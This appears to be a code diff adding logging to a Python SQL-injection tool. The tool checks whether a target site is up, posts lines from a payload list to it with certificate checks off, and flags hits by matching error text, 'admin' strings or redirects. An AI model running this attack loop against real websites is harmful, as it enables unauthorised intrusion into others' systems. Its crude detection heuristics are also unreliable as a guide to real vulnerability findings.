@@ -11,7 +11,9 @@ import socket
 import time
 from datetime import datetime
 import sqlite3
+import logging
 # from database import create_database_for_Captures
+logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)
 
 init()
 
@@ -62,6 +64,7 @@ async def generic_sql_attack_HEADER(urls):
             req = requests.get(urls,verify=False)
             if req.status_code == 200:
                 ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the ip url: {urls}\n Do you want to send the payload to the website? ")
+                logging.info(f"The host:{urls} is up with status code.attack:{attack_type},Time:{datetime.now()}")
 
                 if ask.lower() == "y":
                     for line in sorted_payload.split("\n"):
@@ -75,19 +78,24 @@ async def generic_sql_attack_HEADER(urls):
                         global ack
                         ack = requests.post(url=urls, data=params,verify=False)
                         print(f"[{datetime.now()}]","|Current payload: |", line,"|with status code|:",ack.status_code,"|Attack:|",attack_type,"\n|Headers:|",headers)
+                        logging.info(f"Sending payloads to the website:{urls},Time:{datetime.now()},attack:{attack_type}")
                         print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                         await asyncio.sleep(5)
                         if "error" in ack.text:
                             print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:","Attack:|",attack_type,"\n|Headers:|",headers)
+                            logging.info(f"Could found the error parameter in the target:{urls},Time:{datetime.now()},attack:{attack_type}")
                             
                         vuln = re.findall(pattern=pattern,string=str(ack.text),flags=re.IGNORECASE)
                         htmlVULN = re.findall(pattern=htmlpattern,string=str(ack.text),flags=re.IGNORECASE)
                         if vuln:
                             print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found in the data: |", vuln," | with the count of: |",len(vuln)if len(str(htmlVULN)) != 0 else "Nothing found ","|Attack:|",attack_type,"\n|Headers:|",headers)
+                            logging.info(f"Could found the error parameter in the target:{urls},Time:{datetime.now()},attack:{attack_type}")
                             await asyncio.sleep(3)
+                            
                         
                         if htmlVULN:
                             print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found in html status:|",htmlVULN,"|with the count of:|",  len(htmlVULN) if len(str(htmlVULN)) != 0 else "|Nothing found|","|attack:|",attack_type,"\n|Headers:|",headers)
+                            logging.info(f"Could found the error parameter in the target(html doc):{urls},Time:{datetime.now()},attack:{attack_type}")
                             await asyncio.sleep(3)
                             htmlVulnerbale = True
                             
@@ -97,22 +105,26 @@ async def generic_sql_attack_HEADER(urls):
                         errword = "error" in req.text
                         if word:
                             print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found|:",str("error" in req.text),"with the count of:",len(htmlVULN),"|Attack:|",attack_type,"\n|Headers:|",headers)
+                            logging.info(f"Could find injectable parameter(id=?),Time:{datetime.now()},attack:{attack_type},target:{urls}")
                             await asyncio.sleep(3)
                             # databaseVuln = True
                         
                         if errword:
                             print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:",str("id" in req.text),"with the count of:",len(htmlVULN),"|Attack:|",attack_type,"\n|Headers:|",headers)
+                            logging.info(f"Could find injectable parameter(error),Time:{datetime.now()},attack:{attack_type},target:{urls}")
                             await asyncio.sleep(3)
                             # databaseVuln = True
                             
                         
                             
                     if req.status_code == 302:
-                        print(f"[{datetime.now()}]","Could inject the sq;; to the website:",line,"|Attack:|",attack_type,"\n|Headers:|",headers)
+                        print(f"[{datetime.now()}]","Could inject the sql payload to the website:",line,"|Attack:|",attack_type,"\n|Headers:|",headers)
+                        logging.info(f"Could inject the sql payload to the website,Time:{datetime.now()},attack:{attack_type},target:{urls}")
                         done = True  
                         
                     if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
-                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|",attack_type,"\n|Headers:|",headers)                    
+                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|",attack_type,"\n|Headers:|",headers)       
+                        logging.info(f"Could connect to the website but did found injectable area on the website(admin),Time:{datetime.now()},attack:{attack_type},target:{urls}")             
         # await create_database_for_Captures()
         conn = sqlite3.connect("SQLJresult.db")
         cur = conn.cursor()
@@ -127,6 +139,7 @@ async def generic_sql_attack_HEADER(urls):
         conn.close()
     except Exception as e:
         print(f"[{datetime.now()}]  Error: {str(e)}")
+        logging.error(f"Error: {str(e)}")
         
     except UnicodeEncodeError:
         pass
@@ -142,15 +155,19 @@ async def generic_sql_attack_HEADER(urls):
         
     except ConnectionAbortedError as e:
         print(f"[{datetime.now()}]","[ERROR]ConnectionAbortedError:",e)
+        logging.error(f"{datetime.now()} [ERROR]{e}")
         
     except ConnectionError as e:
         print(f"[{datetime.now()}]","[ERROR]ConnectionError:",e)
+        logging.error(f"{datetime.now()} [ERROR]{e}")
         
     except ConnectionRefusedError as e:
         print(f"[{datetime.now()}]","[ERROR]ConnectionRefusedError",e)
+        logging.error(f"{datetime.now()} [ERROR]{e}")
         
     except ConnectionResetError as e:
         print(f"[{datetime.now()}]","[ERROR]ConnectionResetError:",e)
+        logging.error(f"{datetime.now()} [ERROR]{e}")
         
     except KeyboardInterrupt:
         # ch = input(f"[{datetime.now()}]",Fore.RED+"[!] Are you sure that you want to exit?")
@@ -178,6 +195,7 @@ async def generic_sql_attack_HEADER(urls):
     
     except Exception as e:
         print(f" {datetime.now()} Error: {str(e)}")
+        logging.error(f"Error: {str(e)}")
         
         
     finally:
